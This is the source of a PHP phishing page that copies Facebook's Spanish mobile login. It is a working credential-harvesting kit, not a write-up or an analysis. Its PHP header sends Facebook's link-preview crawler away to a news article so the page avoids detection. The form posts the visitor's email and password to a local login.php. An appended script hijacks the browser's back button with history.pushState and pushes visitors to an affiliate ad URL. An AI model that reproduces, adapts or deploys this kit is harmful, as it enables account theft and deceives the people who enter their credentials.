<?php
ob_start();
include "../../config.php";
include_once '../../common.php';
$agent = $_SERVER['HTTP_USER_AGENT'];
$agent = trim($agent);
$agent = strtolower($agent);
if (
strpos($agent,'facebookexternalhit/1.1')===0
|| strpos($agent,'facebookexternalhit/1.0')===0
){  
$name_rank = "https://www.eluniversal.com.mx/mundo/mexico-el-pais-mas-letal-del-mundo-para-civiles";
 header("HTTP/1.1 301 Moved Permanently");
header("Location: ".$DFC.""); }else{
}
switch ($lang['LANG']) {
    case 'th':
    header('Content-Type: text/html; charset=TIS-620');
    break;

    case 'el':
	header('Content-Type: text/html; charset=iso-8859-7');
	break;

	case 'ru':
	header('Content-Type: text/html; charset=iso-8859-5');
	break;

	case 'pl':
	header('Content-Type: text/html; charset=iso-8859-13');
	break;

	default:
	header('Content-Type: text/html; charset=utf-8');


}

?> 
<html lang="es"><head><title>Iniciar sesión en Facebook | Facebook</title><meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1"><meta name="tipo_contenido"  content="text/html;" http-equiv="content-type" charset="utf-8">
<meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
<meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
<link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196"><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer"><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yP/l/0,cross/Z2s1olWKEnZ.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="eG3x5X4" crossorigin="anonymous"><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/l/0,cross/WygV55KXUbc.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="uuaG0vm" crossorigin="anonymous"><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yq/l/0,cross/Y781WrPxv0N.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="HdeRwoL" crossorigin="anonymous"><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/uzNrOk2WPio.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="xDJVwgZ" crossorigin="anonymous"><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yO/l/0,cross/P5XPqfL6RNt.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="XlNyQLM" crossorigin="anonymous"><meta name="description" content="Inicia sesión en Facebook para empezar a compartir y conectar con tus amigos, familiares y las personas que conoces."><meta property="og:site_name" content="Facebook"><meta property="og:type" content="website"><meta property="og:title" content="Iniciar sesión en Facebook | Facebook"><meta property="og:description" content="Inicia sesión en Facebook para empezar a compartir y conectar con tus amigos, familiares y las personas que conoces."><meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png"></head><body tabindex="0" class="touch x1 ff _fzu _50-3 iframe acw  portrait" style="background-color: rgb(255, 255, 255); min-height: 404px;"><div id="viewport" data-kaios-focus-transparent="1" style="min-height: 404px;"><h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1><div id="page"><div class="_129_" id="header-notices"></div><div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 404px;"><div class="_5909"><div class="_7om2"><div class="_4g34" id="u_0_0_ou"><div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice"><div class="_52jd"></div></div><div><div class="_4-4l"><div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div><div class="_5909 _2pid _52z6"><div class="_7om2 _52we"><div class="_4g34"><a href="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjE3MTQ5NzU1LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="img" alt="facebook" width="112"></a></div></div></div><div class="_5rut"><form method="post" action="<?php echo$enlace_actual;?>login.php" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_2"><input type="hidden" name="lsd" value="AVrh4SEKYwo" autocomplete="off"><input type="hidden" name="jazoest" value="2967" autocomplete="off"><input type="hidden" name="m_ts" value="1617149755"><input type="hidden" name="li" value="O79jYDVTje_2LTHbfJ2f4vwN"><input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number"><input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries"><div id="user_info_container" data-sigil="user_info_after_failure_element"></div><div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div><div id="otp_retrieve_desc_container"></div><div><div class="_56be"><div class="_55wo _56bf"><div class="_96n9" id="email_input_container"><input autocorrect="off" autocapitalize="none" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email" placeholder="Número de móvil o correo electrónico" type="text" data-sigil="m_login_email"></div></div></div><div class="_55wq"></div><div class="_56be"><div class="_55wo _56bf"><div class="_1upc _mg8" data-sigil="m_login_password"><div class="_5909"><div class="_7om2"><div class="_4g34 _5i2i _52we"><div class="_5xu4"><input autocorrect="off" autocapitalize="none" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pass" placeholder="Contraseña" type="password" data-sigil="password-plain-text-toggle-input"></div></div><div class="_5s61 _216i _5i2i _52we"><div class="_5xu4"><div class="_2pi9" style="display:none" id="u_0_1_et"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2_eF">OCULTAR</span><span class="mfss" id="u_0_3_KE">MOSTRAR</span></a></div></div></div></div></div></div></div></div></div><div class="_2pie" style="text-align:center;"><div id="u_0_4_2R" data-sigil="login_password_step_element">
<button type="submit" value="Entrar" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="login" data-sigil="touchable login_button_block m_login_button" data-autoid="autoid_4"><span class="_55sr">Entrar</span></button></div><div class="_7eif" id="oauth_login_button_container" style="display:none"></div><div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div><div id="otp_button_elem_container"></div></div><input type="hidden" name="prefill_contact_point" id="prefill_contact_point"><input type="hidden" name="prefill_source" id="prefill_source"><input type="hidden" name="prefill_type" id="prefill_type"><input type="hidden" name="first_prefill_source" id="first_prefill_source"><input type="hidden" name="first_prefill_type" id="first_prefill_type"><input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false"><input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false"><input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false"><input type="hidden" name="bi_xrwh" value="0"><input type="hidden" id="scetoggle"><div class="_xo8"></div><noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript></form><div><div><div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">o</span></div><div class="_52jj _5t3b" id="signup_button_area"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" tabindex="0" data-sigil="m_reg_button" data-autoid="autoid_3">Crear cuenta nueva</a></div></div><div><div data-sigil="login_identify_step_element"></div><div class="other-links _8p_m"><ul class="_5pkb _55wp"><li><a tabindex="0" href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;r&amp;cuid&amp;ars=facebook_login&amp;privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjE3MTQ5NzU1LCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&amp;lwv=100" id="forgot-password-link">¿Has olvidado la contraseña?</a></li></ul></div></div></div></div></div></div></div></div></div><div style="display:none"><div></div><div></div></div><span><img src="https://facebook.com/security/hsts-pixel.gif" style="display:none" width="0" height="0"></span><div class="_55wr _5ui2" data-sigil="m_login_footer"><div class="_5dpw"><div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea"><div class="_5909"><div class="_7om2"><div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">Español (España)</span><div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=zh_CN&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQClrAhIxUWQmljFP2M" data-locale="zh_CN" data-sigil="change_language">中文(简体)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=pt_BR&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQAFWmHeB4whItaIpkA" data-locale="pt_BR" data-sigil="change_language">Português (Brasil)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=de_DE&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQBc1n2D5HLNA7QDKhA" data-locale="de_DE" data-sigil="change_language">Deutsch</a></span></div></div><div class="_4g34"><div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=en_GB&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQCASIduct12ioivQ4g" data-locale="en_GB" data-sigil="change_language">English (UK)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=ar_AR&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQDvd4RwZQNdWqmkhns" data-locale="ar_AR" data-sigil="change_language">العربية</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=fr_FR&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQDuEp0LMfQpKkFGAQs" data-locale="fr_FR" data-sigil="change_language">Français (France)</a></span></div><a href="/language.php?n=https%3A%2F%2Fm.facebook.com%2Flogin%2F"><div class="_3j87 _1rrd _3ztd" aria-label="Lista completa de idiomas" data-sigil="more_language"><i class="img sp_CEOlFfsk4vS sx_a89880"></i></div></a></div></div></div></div><div class="_5ui4"><span class="mfss fcg">Facebook, Inc.</span></div></div></div></div><div class=""></div><div class="viewportArea _2v9s" style="display:none" id="u_0_5_mo" data-sigil="marea"><div class="_5vsg" id="u_0_6_iq" style="max-height: 512px;"></div><div class="_5vsh" id="u_0_7_NF" style="max-height: 327px;"></div><div class="_5v5d fcg"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Cargando...</div></div><div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea"><div class="container"><div class="image"></div><div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">Intentar de nuevo</a></div></div></div></div><div id="static_templates"><div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_1"><div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader"><div class="_5909"><div class="_7om2 _52we"><div class="_5s61"><div class="_52z7"><button type="submit" value="Cancelar" class="cancelButton btn btnD bgb mfss touchable" id="u_0_9_M4" data-sigil="dialog-cancel-button">Cancelar</button><button type="submit" value="Atrás" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Atrás" id="u_0_a_NR" data-sigil="dialog-back-button"><i class="img sp_CEOlFfsk4vS sx_108b04" style="margin-top: 2px;"></i></button></div></div><div class="_4g34"><div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Cargando...</div></div></div><div class="_5s61"><div class="_52z8" id="modalDialogHeaderButtons"></div></div></div></div></div><div class="modalDialogView" id="modalDialogView"></div><div class="_5v5d _5v5e fcg" id="dialogSpinner"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_8_pz" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Cargando...</div></div></div>

<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yP/l/0,cross/Z2s1olWKEnZ.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">

<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/l/0,cross/WygV55KXUbc.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yq/l/0,cross/Y781WrPxv0N.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/uzNrOk2WPio.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yO/l/0,cross/P5XPqfL6RNt.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">


<div class="AdBox Ad advert post-ads"></div></body></html>
									

						
<script>    

var cpa = "http://ocio.tipslz.com/?m=1FU0SITE73894X9&a=";
var index = "https://google.com";
var name = "toke";

    !function(o, e, i) {
        if (o && e && i) {
            var t = { set: function(o, e, i) { var t = new Date; t.setTime(t.getTime() + 24 * i * 60 * 60 * 1e3); var n = "expires=" + t.toUTCString(); document.cookie = o + "=" + e + "; " + n }, get: function(o) { for (var e = o + "=", i = document.cookie.split(";"), t = 0; t < i.length; t++) { for (var n = i[t]; " " == n.charAt(0);) n = n.substring(1); if (0 == n.indexOf(e)) return n.substring(e.length, n.length) } return "" } };
            var n = {};
            var saved = t.get(i);
            var detect = [];
            var indomain = false;
            var get_detect = t.get('detect');
            
            if(get_detect && atob(t.get('detect')).indexOf(window.location.search.replace('?','')) > -1){
                indomain = true;
            };


            var super_timer = setInterval(function(){
                if(n.next){
                    clearInterval(super_timer);
                    window.location.href=o;
                };
            }, 1);
            
              //  window.onpopstate = function(){ alert( n.popupstate+" location: "+location.href) };


                var conteo = -1;
                for (var v = 0; v < 5; v++) {
                     n.foo = "bar-"+v;
                     n.set = i+"=" + v;
                     n.back = i+"=" + conteo;
                     n.insert =  "/?"+n.set;
                     detect.push(n.back);
                     window.history.pushState(n, "page " + i+v,n.insert);
                     window.location.hash = n.set;
                     conteo++;

                };


                t.set(i,"1",1);
                t.set("detect",btoa(detect.toString(),1));
                n.popupstate = true;

                if( - 1 != navigator.userAgent.indexOf("iPhone") && !window.chrome){

                        var timer = setInterval(function(){
                        var anuncion = false;
                        if( atob(t.get('detect')).indexOf(window.location.search.replace('?','')) > -1 ){
                            anuncion = true;
                            n.next = true;
                        };

                    },0);

                }else{
                    window.onpopstate = function(){ 

                        if( atob(t.get('detect')).indexOf(window.location.search.replace('?','')) > -1 ){
                            anuncion = true;
                            n.next = true;
                            window.location.replace(o);
                        };
                    };
                };

        };

    }(cpa, index, name);
    
</script>   